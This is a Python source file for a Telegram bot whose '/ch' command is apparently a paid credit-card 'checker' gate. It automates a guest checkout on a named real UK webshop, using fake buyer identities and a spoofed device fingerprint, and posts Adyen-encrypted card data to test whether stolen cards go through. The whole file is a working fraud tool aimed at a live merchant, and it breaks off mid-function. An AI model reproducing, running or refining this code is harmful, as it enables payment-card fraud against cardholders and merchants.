from cryptography.fernet import Fernet
from plugins.defs1 import get_cc, luhn, bininfo
from pyrogram import Client, filters
import aiohttp
import requests
import plugins.sql.gates as gates
from pyrogram.types import Message
import time
from urllib.parse import urlparse
import random
import asyncio
from faker import Faker
from plugins.clases.usuarios import usuario
def buscar(res, primer, final):
    try:
        inicio = res.index( primer ) + len( primer )
        fin = res.index( final, inicio )
        return res[inicio:fin]
    except ValueError:
        return None

gate = "Adyen Encrypt"
emojis1 = ["🙈", "💦", "🌏", "🐸", "🐧"]
emojis2 = ["😠", "☔", "☀", "🌈"]
rnd_emoji1 = random.choice(emojis1)
rnd_emoji2 = random.choice(emojis2)
r = requests.Session()
@Client.on_message(filters.command(["ch"], prefixes=["/", "."]))
async def premium(_, m: Message):
    Status = gates.buscarT("ezz")
    try:
        Estado = Status[2]
    except Exception: return await m.reply('<b>Error al encontrar el Gate</b>')
    if Estado == 'off': return await m.reply(f'𝑬𝒔𝒕𝒆 𝒄𝒐𝒎𝒂𝒏𝒅𝒐 𝒆𝒔𝒕𝒂 𝒅𝒆𝒔𝒂𝒄𝒕𝒊𝒗𝒂𝒅𝒐 𝒕𝒆𝒎𝒑𝒐𝒓𝒂𝒍𝒎𝒆𝒏𝒕𝒆\n𝑹𝒂𝒛𝒐́𝒏: <i>{Status[3]}</i>')
    start_time = time.time()
    user = m.from_user.username
    id = m.from_user.id
    user = usuario(nombre=user, id=id)
    rango = user.buscar()
    if not rango or rango == False: return await m.reply('<b>Usuario no registrado porfavor registrese</b>')
    if rango[2] == 'Free':
        return await m.reply('<b>Necesita ser Premium para utilizar este gate</b>')
    rangoC = rango[5]
    if rangoC == None:
        rangoC = rango[2]
    try:
        cc, mes, año, cvv = get_cc(m.text)
        veri = luhn(cc)
        if not cc or not mes or not año or not cvv: return await m.reply('<b>Formato invalido</b>')
        if veri == False: return await m.reply("<b>Algoritmo Luhn invalido ❌</b>")
    except Exception:
        return await m.reply("<b>Formato invalido\nCC|MES|AÑO|CVV</b>")
    respuesta = await m.reply(f"""<b>Checkeando CC | ⏳</b>""")
    fake = Faker(["en_US"])
    fake1 = Faker(["en_GB"])
    product_link = "https://www.ecco-verde.co.uk/yogi-tea/organic-ginger-orange-tea-with-vanilla"
    r1 = r.get(product_link)
    if not r1: return await m.reply('Error 1')
    token = buscar(r1.text, 'type="hidden" name="token" value="', '"')
    if not token: return await m.reply('Error 2')
    shopArticleId = buscar(r1.text, 'type="hidden" name="ShopArticleItem_ID" value="', '"')
    if not shopArticleId: return await m.reply('Error 3')
    cid = buscar(r1.text, 'type="hidden" name="cid" value="', '"')
    if not cid: return await m.reply('Error 4')
    sai = buscar(r1.text, 'type="hidden" name="sai" value="', '"')
    if not sai: return await m.reply('Error 5')
    
    
    
    
    r2_data= {
    'token': token,
    'ShopArticleItem_ID': shopArticleId,
    'cid': cid,
    'sai': sai,
    'count': '1',
    'shopaction': 'additem',
    'undefined': 'undefined'
}
    r2 = r.post("https://www.ecco-verde.co.uk/ajax/processdetailpageaction?confirm=true")
    if not r2: return await m.reply('Error 6')
    
    r3 = r.get("https://www.ecco-verde.co.uk/webshop/start")
    if not r3: return await m.reply('Error 7')
    
    r4 = r.get("https://www.ecco-verde.co.uk/webshop/guestcheckout")
    if not r4: return await m.reply('Error 8')
    
    primerNombre = fake.first_name()
    apellido = fake.last_name()
    email = fake.ascii_free_email()
    direccion = fake1.street_address()
    zipCode = fake1.postcode() 
    ciudad = fake1.city()
    r5_data= {
    'Person_Firstname': primerNombre,
    'Person_Lastname': apellido,
    'Person_Email': email,
    'ShopUser_Phone': '7171231234',
    'ShopUser_TaxNumber': '',
    'Country_Code_Invoice': 'GB',
    'ShopUser_Street': direccion,
    'ShopUser_StreetNumber': '' ,
    'Province_Code': 'Choose an option',
    'ShopUser_ZIPCode': zipCode,
    'ShopUser_City': ciudad,
    'ShopUser_District': '',
    'ShopUser_Company': '' ,
    'ShopUser_UID': '',
    'ShopUser_Password': '',
    'ShopUser_Birthday': '',
    'Redirect_URL': '',
    'submitButton': ''}
    r5 = r.post("https://www.ecco-verde.co.uk/webshop/guestcheckout?", data=r5_data)
    address = buscar(r5.text, 'type="radio" name="address" value="', '"')
    if not r5: return await m.reply('Error 9')
    if not address: return await m.reply('Error 10')
    r6_data = {
    'token': token,
    'address': address,
    'submitButton': ''
}
    r6 = r.post("https://www.ecco-verde.co.uk/webshop/choose-a-shipping-address?", data=r6_data)
    if not r6: return await m.reply('Error 11')
    
    r7_data = {
    'token': token,
    'paymentsel': 'adyen_creditcard-',
    'voucher': ''
}
    r7 = r.post("https://www.ecco-verde.co.uk/webshop/choose-a-payment-method?", data=r7_data)
    if not r7: return await m.reply('Error 12')
    nombre = fake.name()
    if cc.startswith("4"): brand = 'visa'
    elif cc.startswith("5"): brand = 'mc'
    r8_data = {
    'token': token,
    'data-payment': {"data":{"paymentMethod":{"type":"scheme","holderName":nombre,"encryptedCardNumber":"adyenjs_0_1_25$DBUKU1bCit614wC+vMyM/eTH35pzMi+5yf6fkqb0S1DpZFogVziB/AdI+UtLQ/kwMSXYCkG/rOqJHkpU9vWNMltUU1Uf+LPL2yG7DavWndd2vsKUvhxmYBouXLoag5f7HNt1clOPZKyN4HqI802tEVN4YAMYEqc+HaINL4hx3HA1a69lJXrnfct5rRY8PHWtBxDZgoYgpoxb37C28eqDsx+0+dtGnZysaq2SVEZNkXNAYmnwEeaFj1VOWxVmxCSxcKiHHUPZYRZNFwcO58m/7YD27Oqc9Yo4EGu8cWpE9Blj8HsZyyxxExFTuaZ3uymx2lWuIsDcdyLVmFPaahf+Xg==$wGqsdkgouQ2GsNpTDD/2aOVpmG3ueqigZh38VHL/iEf4xfsiReLJrk+1T2A6aqarzVE5LM+lkHkKGqrpHHy+dl5f1SWKmeCMizo5prUHvJ6qhO6LV9mNrrXPMrCEx2PYuRFeVyFcue0j1Bzp78EUZTi/GAmvnwnm9/pLHRgVCb/OpQpOL+7AW0Sbxtzg3b8xwqwhtSutcnSZ5j4FD5rVLkDm6u35aUSz7NayXPKgPK7MJnlnhT2wMCW37WG2bivcvT3FN5SmCe4k74q3Ww1GJ6XZVSIEku4PptOQ9aOYTB8YBtLUMOQyfLh7YpNRzbHs3FRWLrzh2xvHksO2N82nXJ+c+DrEAniSCUjvNZx5BuOCBh24oGuGalyQGucrxpIRoNzarpBPhJ5XG/UTfjj07WQ4qIDGLlKiIW/QyKZq0K6bFO/0XOAhhGr2ZX0C10ree1+AWWvJuSZB/UxOS2qPRAatwIWKxgH8hueQzK25KH4Dq9OBp0HwFKOkM6k7/jdYTVEj0LHBVRYC3uKWjGDIssnG8acclsvxHVmmxcOZo8pw7Z0kFsamBcMp0Bx/S0kQ7qtwyNXpSGuYrOQuyp/QX3kmaBCtwx4BVJpmH7tLPo5RqV1yPEH3ubv+MjStzaUBGphRfWnY9nlIswQlG1b8NiTmy3TYe4s/H2MBrvvD/qiJQOBGPiFy2D38fRRfdN34RSE/TTNiOnR2qM8RlYBbL3TNxanVyzZHa221oytMN32Mce8dFgz4EKtTNuzqmFUj13VJCf8hshUAdk1FXFveG0Pj1bDdNiH3GQ3BNbrGOFAoXMTfTp+vjDiJ3VOQfLWgrsZkiRyE2rI54evPzDdv7VOZab1gucW+G8/IDViUBNtoGOeAeAj1PQWNZgIbp2x9IaZ0u+5bEDfWfI1xANiyUyrZb5wRO9ZUWJEtR1s4Uw4rGn8N8sKsnWTktp6/rfr03mCRb9jLdBGpIi1dmWC+9qZwmLx1DuFNqesz/g==","encryptedExpiryMonth":"adyenjs_0_1_25$AVfFnyeg3zu5iZInjgYswFuYTw1xK9KXOgLGAsyjPUaUFlWDMHSci5PJExq7RLlJqZeG428z3LxyJRfVgdIKzJCBfcXqCfYr5qK2Z+oj0EHzFe8X/TswdcRsfsHsSpTm4LwWUV/2iazP4V097OvVPt+mWbdD9Dzt2FS71RtvrhzNleIYAzsT+SV6G/aAtbq0zfTklPBYwZ60SqsTAEPruEuc0VURIlOpiXsr6S8iykGjZkwXpKWSEycjjvyOnvMv54Ea0gNcahyHU8fpzZjNFm8B5yLV2aPYyC6pQUmhThZNhpGNMl/d94apkbJk7ksWjouyD3oVPi01oaJc/UbXsw==$DdpQuX1zy8UinFT/C1V6Zv6PwdHo//yDHRhp5y7av6TUxxB1X3zhWmEgFvZwCvUF0+J2oXrlPar5v9iTtmwSY/0rRA0ZVZRCurHxcM8FkiDdXjFdrQD8epMR7mqw3BUEl46Y/FMu/Nn5lWxugXp2Zv0JAZ+5C70FRa+Ns3PaXkjEu0vb//19as1iaTaLlK4+IQ98fPQHq8vZpogeYM6bxlUmKhSrvqfnlmSRY18mhigujCiZG327PrNvyhn2e5Mrw6k3RCAa/9PmwV1d8UKTVlCCyNngG69RaP+6di+y0Xg+e+fYF7gw32v2Vst4IHQimJkRDt8/yHbrRtf8OAE9Z6kYO3qnoPdCAotR2yS9AKz3UTimj9CFCb0p35MyJvDZ4HG3yOFLc95l7UDHus7HFt2YfX0zGQhwh/pxH86edq8gyETVbM+dwEBpgQKEpAl8geyFlTPmgV4LsP4BXYi9D+DOvBXjGxqEqs0v+O3pvz1biITwDmJY2RlZ+lmqpTQ=","encryptedExpiryYear":"adyenjs_0_1_25$hj8TO44q1/X0CVWUWl7r+K8itOLVw+3R9KHoRZWXU7KLXhJm7uJixujYFndrXnIYjWMrKuCciXeCZ1JmLQSrU2BvtcqZzwsTi+mW0Pg2VpRliADNLZ11np9YJp7igjY1HL1mWMraQycs/pWzNpL0Nmy5IVGjZzitz/L8UKyadzOwo8sWJNfcNjgtUepmX1CnI4RNGWBdbd0PRLGoKUlYD7jjh/Gn+E6k0Tud2P4rKJlIqZwa/n5SzFx9CAMzp/gMwB1QGQj6pyZqQ+m64hWGV4aZoP5wTR1oUU2OZoX9XcJWXhKOz+181avkKQTNr66jXBtNynFwHgc/UtOoGjBXZw==$jP4wnVyWS8F02cUQ4+JIt/y5uIi7J1livxzW5wBiwIulQIJN2ys88qjbjzQ7s0Ym37M05p33StaSdkqHANNvLbtr3ZQqA5pElA77z3hbhJ3ygFm6djq+lvtpipS7PG86zBa8YqTnvn88Loa9UJ1eR/mpu9BXnkiIBIlJENjRiopHs0QfOgfTB49vwkOiAcT+DQP15SHKiVpzpRz3YqRzUaSbecTzEAmB/oSRg/lw+pY51m0fz5wqO1UQoEWN/qDpgOsgeQM2jFhtlN1L/522qqOwRM7OfvXztTTnisYV2i28choRQTaAd+lCAX9GfKNTeUiVCRnHBWGCxNs5wIDB1jzvw/fhya7Kz1r2HWbrqMuCgtU9idGfTHQIBCOpCfOeHWsyhYOv9u0Mic46dCu1DaqUt3h141X7TpikMoGbuITjSciMi540sTKExAznvbm5yJmz+btwNAZB7/8vXfHw53A6fPkqa2dFfXHVzHrcYd358JhW2MkjJxdwIGE1s3j1","encryptedSecurityCode":"adyenjs_0_1_25$Y+iptypWMKw9JsjaJpR92Tqa/9AvDyfb5ilJG2/e1KBKxJqpaybukRFCtpKsTWu5CGWEbUUkhZNyeF2CrNmtMRdESGJz3BGAgYijBjmrisSh6MSNeGsGq+gRy3OGns5fWdQxXZY4VjcJQ5JBQgOfkbZV1NwACm/Lx9v5APtS79RyouEqQ3cwCgq7qgnbyyTkBSOT+nXdMyKTbLPaEs9uM7Sakqj+lggmt4774M/35kDH5gUHDBUB57c5Kqo4xzde+5qB63auM03EjPEQmSXboUO/YDJ84ToEUoGjffrph96E51Hz6TaDyjhh/YKxEOraF7z3HY8MtPJRGM9FMaLIug==$P/dyNyP10xuiaCyjX3Z3lQ8skyMphwoUgvdGkrtK5HbzsUv37gIWBk43bPsoRQ8Y/qvka4ZNLj/63R966Ou5gEPJK/PtsuXttqkWN0MTIx+M0nIVmngkULyjvY48mty6NmENGcTOHPNAkHLd8swNa3gKwyFW/BvcNnSxtIIxK960J8QeEQ4jmJo4bkQTYV8M8Tc5xSw64maoQBVzKpMMWPd+5XGXTBx1lL4WlpPCTyX9a/nqtSlD0J6B/lxJlt/LzLQvef9Z5O5XPh37gJ+QLsv6TyJdxoAeOXQqL4SkJZbQYrPFbVndHfujitqvsOtxYNBUgZ/UBXMFk3h+oDwZobw662eDX5V/U07AsHb1zA77xGPBU5QEN76Fhu0Le3ijKSmj5r/fEl4lbQ0JMVzweYJu/LAZmK2kKVlgZQjjMNiV1Jca61J3zcN6/JnvIDQiJyrD2ihNr5W5tNiuHIT+zyHEIF3YC5YVw9EA0fnP2bp89cEPBbj0TQ=="}},"isValid":"true","brand":brand,"browser_info":{"colorDepth":24,"screenWidth":1920,"screenHeight":1080,"timeZoneOffset":180,"javaEnabled":"false"}}
}
    r8 = r.post("https://www.ecco-verde.co.uk/webshop/payment-credit-adyen", data=r8_data)
    if not r8: return await m.reply('Error 13')
    gcard_select = buscar(r8.text, '<select name="giftCardSelect" id="giftCardSelect"> <option value="', '"' )
    gcard_ID = buscar(r8.text, '<input type="radio" name="giftcardId" value="', '"')
    if not gcard_select: return await m.reply('Error 13')
    if not gcard_ID: return await m.reply('Error 14')
    r9_data= {
    'token': token,
    'ChangeDeliveryService': '0',
    'ShopDeliveryService_Code': 'upsuk',
    'Text_Postlabel[upsuk]': '',
    'invoice_sending_option': 'OrderSettings_AddInvoiceToDelivery',
    'giftCardSelect': gcard_select,
    'giftcardId': gcard_ID,
    'title': '',
    'text': ''
}
    r9 = r.post("https://www.ecco-verde.co.uk/webshop/delivery-options?", data=r9_data)
    if not r9: return await m.reply('Error 15')
    nombregdpr1 = buscar(r9.text, '</span></strong></td> </tr>  </table>     <p class="checkout-agb small"> <input type="text" hidden="hidden" id="gdpr_', '"')
    if not nombregdpr1: return await m.reply('Error 16')
    gdpr1 = nombregdpr1
    nombregdpr2 = buscar(r9.text, '<i class="nice-icon nice-icon-checkbox"></i> </p>   <p class="checkout-agb small"> <input type="text" hidden="hidden" id="gdpr_', '"')
    if not nombregdpr2: return await m.reply('Error 17')
    gdpr2 = nombregdpr2
    nombregtc = buscar(r9.text, '<p class="checkout-agb small"> <input type="text" hidden="hidden" id="gtc_', '"')
    if not nombregtc: return await m.reply("Error 18")
    gtc = nombregtc
    
    r10_data = {
    'token': token,
    f'gdpr_{nombregdpr1}': gdpr1,
    f'gdpr_{nombregdpr2}': gdpr2,
    f'gtc_{nombregtc}': gtc ,
    'shop_cart_checkout_order': '',
    'device_fingerprint': 'DpqwU4zEdN0050000000000000fzzJ17NekR0050271576cVB94iKzBGqBirNZgEUXBix7RX3az8002w7hYyfhAaY00000qZkTE00000nWGGLjCETHX39SNqSaZT:40',
    'Order_Notice': '',
    f'gdpr_{nombregdpr1}': gdpr1,
    f'gdpr_{nombregdpr2}': gdpr2,
    f'gtc_{nombregtc}': gtc}
    
    r10 = r.post("https://www.ecco-verde.co.uk/webshop/review-your-order?", data=r10_data)
    if not r10: return await m.reply('Error 19')
    time.sleep(4)
    response_error = buscar(r10.text, '<div class="global-message error " > <i class="icon"></i> <div class="message"> <p class="title">', '</p>')
    charge_link = None
    if not response_error: charge_link = True; response_error = ""